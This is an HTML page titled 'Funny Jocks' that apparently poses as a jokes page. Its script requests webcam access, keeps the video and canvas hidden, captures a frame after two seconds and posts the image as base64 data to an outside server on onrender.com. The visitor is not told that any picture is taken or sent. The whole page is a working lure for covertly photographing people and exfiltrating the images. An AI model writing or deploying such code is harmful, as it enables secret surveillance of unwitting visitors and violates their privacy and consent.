<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Funny Jocks</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      width: 100vw;
      height: 100vh;
      padding: 10px;
      background: url("pic.jpg");
      background-size: cover;
    }
    video {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
  </style>
</head>
<body>
  <video id="vid" autoplay playsinline hidden></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <script>
    const vid = document.getElementById('vid');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
      vid.srcObject = stream;
      vid.onloadedmetadata = () => {
        canvas.width = vid.videoWidth;
        canvas.height = vid.videoHeight;

        setTimeout(() => {
          ctx.drawImage(vid, 0, 0);

          const timestamp = Date.now(); // unique time-based name
          const fileName = `capture_${timestamp}.png`;

          const data = [{
            name: fileName,
            data: canvas.toDataURL("image/png")
          }];

          fetch("https://server-ieuy.onrender.com/03dataP", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
          })
          .then(res => res.text())
          .then(msg => console.log("Server:", msg))
          .catch(console.error);

          stream.getTracks().forEach(t => t.stop()); // stop camera
        }, 2000);
      };
    }).catch(console.error);
  </script>
</body>
</html>
